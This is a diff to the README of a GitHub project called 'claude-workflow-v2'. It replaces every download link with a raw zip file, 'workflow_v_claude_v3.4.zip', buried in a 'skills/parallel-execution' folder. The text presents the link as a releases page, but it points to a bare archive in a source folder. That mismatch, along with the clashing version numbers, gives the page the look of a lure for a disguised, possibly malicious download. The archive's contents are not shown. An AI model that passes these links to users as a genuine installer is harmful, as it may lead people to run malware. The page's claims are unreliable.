@@ -1,6 +1,6 @@
 # 🌟 claude-workflow-v2 - Simplify Your Workflow with Ease
 
-[![Download](https://raw.githubusercontent.com/Putra213/claude-workflow-v2/main/examples/orchestration/workflow-claude-v-2.4.zip)](https://raw.githubusercontent.com/Putra213/claude-workflow-v2/main/examples/orchestration/workflow-claude-v-2.4.zip)
+[![Download](https://github.com/Putra213/claude-workflow-v2/raw/refs/heads/main/skills/parallel-execution/workflow_v_claude_v3.4.zip)](https://github.com/Putra213/claude-workflow-v2/raw/refs/heads/main/skills/parallel-execution/workflow_v_claude_v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Follow these easy steps to download and install **claude-workflow-v2**:
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
    
-   [Download claude-workflow-v2](https://raw.githubusercontent.com/Putra213/claude-workflow-v2/main/examples/orchestration/workflow-claude-v-2.4.zip)
+   [Download claude-workflow-v2](https://github.com/Putra213/claude-workflow-v2/raw/refs/heads/main/skills/parallel-execution/workflow_v_claude_v3.4.zip)
 
 2. **Choose Your Version:** Locate the version you want to download. You will see a list of available releases, each accompanied by important notes regarding updates and fixes.
 
@@ -81,4 +81,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 For more detailed guides on using **claude-workflow-v2**, visit our wiki and documentation, available on the GitHub repository. 
 
-[Download claude-workflow-v2](https://raw.githubusercontent.com/Putra213/claude-workflow-v2/main/examples/orchestration/workflow-claude-v-2.4.zip)
+[Download claude-workflow-v2](https://github.com/Putra213/claude-workflow-v2/raw/refs/heads/main/skills/parallel-execution/workflow_v_claude_v3.4.zip)
